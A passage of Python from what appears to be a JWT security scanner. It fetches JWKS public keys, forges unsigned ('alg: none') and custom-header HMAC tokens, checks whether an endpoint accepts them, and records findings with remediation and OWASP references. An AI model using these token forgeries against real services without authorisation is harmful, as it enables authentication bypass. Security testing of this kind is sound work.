                '/.well-known/openid-configuration',
                '/api/.well-known/jwks.json',
            ]

            base_url = endpoint.rsplit('/', 2)[0] if '/' in endpoint else endpoint

            for jwks_path in jwks_endpoints:
                try:
                    jwks_url = base_url + jwks_path
                    response = await self.client.get(jwks_url)

                    if hasattr(response, 'json'):
                        data = response.json()
                        if 'keys' in data and len(data['keys']) > 0:
                            # Extract first public key
                            key_data = data['keys'][0]
                            # Convert JWK to PEM (simplified - real implementation would be more complex)
                            return str(key_data)
                except:
                    pass

        except Exception as e:
            logger.debug(f"Could not extract public key: {e}")

        return None

    def _create_token_with_alg(self, header: dict, payload: dict, alg: str, secret: str) -> str:
        """Create JWT with specific algorithm"""
        try:
            if alg == 'none':
                return self._create_unsigned_token(payload)
            else:
                return jwt.encode(payload, secret, algorithm=alg)
        except Exception as e:
            logger.debug(f"Error creating token with alg {alg}: {e}")
            return ""

    def _create_token_with_headers(self, header: dict, payload: dict, secret: str) -> str:
        """Create JWT with custom headers"""
        try:
            alg = header.get('alg', 'HS256')

            if alg == 'none':
                header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
                payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
                return f"{header_b64}.{payload_b64}."
            else:
                # For signed tokens, PyJWT doesn't easily allow custom headers
                # So we manually construct it
                header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
                payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

                # Create signature (simplified - only works for HS256)
                if alg.startswith('HS'):
                    import hmac
                    message = f"{header_b64}.{payload_b64}"

                    if alg == 'HS256':
                        signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
                    elif alg == 'HS384':
                        signature = hmac.new(secret.encode(), message.encode(), hashlib.sha384).digest()
                    else:  # HS512
                        signature = hmac.new(secret.encode(), message.encode(), hashlib.sha512).digest()

                    signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
                    return f"{header_b64}.{payload_b64}.{signature_b64}"
                else:
                    # For RSA/ECDSA, use PyJWT
                    return jwt.encode(payload, secret, algorithm=alg, headers=header)
        except Exception as e:
            logger.debug(f"Error creating token with headers: {e}")
            return ""

    def _create_unsigned_token(self, payload: dict) -> str:
        """Create unsigned JWT (alg: none)"""
        header = {"typ": "JWT", "alg": "none"}
        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        return f"{header_b64}.{payload_b64}."

    async def _test_token_accepted(self, endpoint: str, token: str) -> bool:
        """Test if server accepts a token"""
        if not token:
            return False

        try:
            # Try with Authorization header
            headers = {"Authorization": f"Bearer {token}"}
            response = await self.client.get(endpoint, headers=headers)

            if hasattr(response, 'status_code'):
                # 200/201/204 = accepted, 401/403 = rejected
                if response.status_code in [200, 201, 202, 204]:
                    return True
                elif response.status_code in [401, 403]:
                    return False

            # Check response body for success indicators
            if hasattr(response, 'text'):
                body = response.text.lower()
                success_keywords = ['success', 'authenticated', 'welcome', 'dashboard', 'profile']
                error_keywords = ['unauthorized', 'forbidden', 'invalid', 'expired']

                has_success = any(kw in body for kw in success_keywords)
                has_error = any(kw in body for kw in error_keywords)

                return has_success and not has_error

        except Exception as e:
            logger.debug(f"Token test error: {e}")

        return False

    def _create_vuln(self, vuln_id: str, title: str, severity: SeverityLevel,
                     endpoint: str, description: str, poc: str, payload: str,
                     remediation: str, cwe: str, owasp: str = "A07:2021") -> Vulnerability:
        """Helper to create vulnerability object"""
        return Vulnerability(
            id=vuln_id,
            title=title,
            description=description,
            severity=severity,
            category=VulnerabilityCategory.BROKEN_AUTHENTICATION,
            affected_url=endpoint,
            affected_parameter="JWT Token",
            proof_of_concept=poc,
            payload=payload,
            remediation=remediation,
            cwe_id=cwe,
            owasp_category=owasp,
            references=[
                "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_JWT",
                "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
                "https://tools.ietf.org/html/rfc8725",
                "https://portswigger.net/web-security/jwt"
            ]
        )
